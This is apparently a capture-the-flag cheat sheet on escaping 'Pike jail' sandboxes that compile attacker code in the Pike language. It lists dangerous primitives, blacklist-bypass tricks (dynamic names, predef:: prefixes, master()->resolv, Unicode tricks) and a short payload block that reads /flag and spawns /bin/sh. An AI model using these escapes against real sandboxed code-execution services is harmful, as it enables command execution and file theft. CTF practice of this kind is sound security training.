# Sandbox escape — Pike language

Pike is a C-like interpreted language (interpreter: `pike`, package `pike8.0`). "Pike jail" challenges `compile_string`/`compile()` attacker code with a restricted program parent or a filtered environment. First step: **have the interpreter locally** (`pike --version`) so you can test escapes before sending them.

## Dangerous primitives (what to reach for)
- **`Process.create_process(({"/bin/sh","-c","id"}))`** and `Process.run(...)` / `Process.system(...)` — spawn processes.
- **`System.*`** — `System.getenv`, low-level syscalls.
- **`Stdio.File("/flag","r")->read()`** — direct file read (often enough; you rarely need full RCE).
- **`Stdio.FILE`, `Filesystem.Traversion`** — filesystem walk.
- **`compile_string(code)()`** / **`master()->…`** — the compiler and master object; reaching the *master* object bypasses most sandboxes because it resolves modules and file access.
- **`predef::`** and **`_static_modules`** — the global/predefined scope; if the sandbox only shadows names in the local scope, `predef::Process` still works.

## Typical escapes
- If the sandbox blacklists identifiers as strings, **obfuscate**: build names dynamically, use `predef::` prefix, `master()->resolv("Process.create_process")`, or Unicode/whitespace tricks the filter misses.
- If only certain modules are removed from the environment, get them back via `master()->resolv(...)` or `_static_modules`.
- If code is run in a "restricted program", check whether `Stdio`/`Process` are actually removed or merely not imported — often just `import`/prefix them fully.
- Simplest win: the flag is usually a file → `Stdio.File("flag.txt")->read()` or `Stdio.read_file("/flag")`.

```pike
// read the flag directly (often sufficient)
write("%s", Stdio.read_file("/flag"));
// or spawn a shell
Process.create_process(({"/bin/sh","-c","cat /flag"}));
// recover a blocked module via master
object p = master()->resolv("Process");
```

Recognition: `.pike` source, `compile_string`, `master()`, `Process`, `Stdio`; a prompt that "runs Pike code" with a blacklist. Test every payload against the local `pike` interpreter first (blacklists are usually string-matching and easy to bypass by aliasing/prefixing).
